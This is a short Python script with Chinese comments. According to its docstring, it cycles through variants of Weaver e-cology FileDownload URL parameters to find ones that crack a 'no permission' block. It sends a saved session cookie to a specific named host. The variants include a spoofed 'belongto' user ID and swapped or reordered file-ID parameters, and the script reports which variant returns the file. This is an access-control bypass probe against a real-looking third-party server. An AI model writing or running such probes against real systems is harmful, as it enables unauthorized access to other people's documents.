# -*- coding: utf-8 -*-
"""对单个 fileid 尝试多种 FileDownload 参数组合，找出"无权限"的破解参数。

用法: python tools/e9_dl_variants.py [fileid] [requestid]
"""
from __future__ import annotations

import re
import sys
import urllib.request
from pathlib import Path

FID = int(sys.argv[1]) if len(sys.argv) > 1 else 297063
RID = int(sys.argv[2]) if len(sys.argv) > 2 else 1231910
ORIGIN = "http://hc.hcipi.com:8088"
CK = Path(__file__).resolve().parent.parent / "data" / ".e9_cookie"

VARIANTS = [
    ("裸 fileid", "/weaver/weaver.file.FileDownload?fileid=%d" % FID),
    ("download=1", "/weaver/weaver.file.FileDownload?fileid=%d&download=1" % FID),
    ("fromrequest", "/weaver/weaver.file.FileDownload?fileid=%d&download=1&fromrequest=1&requestid=%d" % (FID, RID)),
    ("fromrequest+belongto", "/weaver/weaver.file.FileDownload?fileid=%d&download=1&fromrequest=1&requestid=%d"
     "&f_weaver_belongto_userid=3426&f_weaver_belongto_usertype=0" % (FID, RID)),
    ("imagefileId 大写", "/weaver/weaver.file.FileDownload?imagefileId=%d" % FID),
    ("imagefileid 小写", "/weaver/weaver.file.FileDownload?imagefileid=%d" % FID),
    ("乱序1", "/weaver/weaver.file.FileDownload?fileid=%d&imagefileid=%d&requestid=%d&download=1" % (FID, FID, RID)),
]


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8")
    ck = CK.read_text(encoding="utf-8").strip()
    for name, path in VARIANTS:
        h = {"Cookie": ck, "User-Agent": "Mozilla/5.0",
             "Referer": "%s/wui/index.html" % ORIGIN}
        try:
            r = urllib.request.urlopen(urllib.request.Request(ORIGIN + path, headers=h), timeout=30)
            body = r.read()
            is_html = body.lstrip()[:9].lower().startswith(b"<!doctype") or body.lstrip()[:5].lower().startswith(b"<html")
            if is_html:
                txt = re.sub(r"<script[\s\S]*?</script>", " ", body.decode("utf-8", "replace"))
                txt = re.sub(r"<[^>]+>", " ", txt)
                msg = re.sub(r"\s+", " ", txt).strip()
                msg = msg.replace("-->", "").strip()[:60]
                print("%-22s -> HTML(%d字节) %s" % (name, len(body), msg))
            else:
                print("%-22s -> 文件 OK  %s  %d字节  disp=%s" % (name, r.headers.get("Content-Type"), len(body), r.headers.get("Content-Disposition")))
        except Exception as e:
            print("%-22s -> 异常 %r" % (name, e))
    return 0


if __name__ == "__main__":
    sys.exit(main())
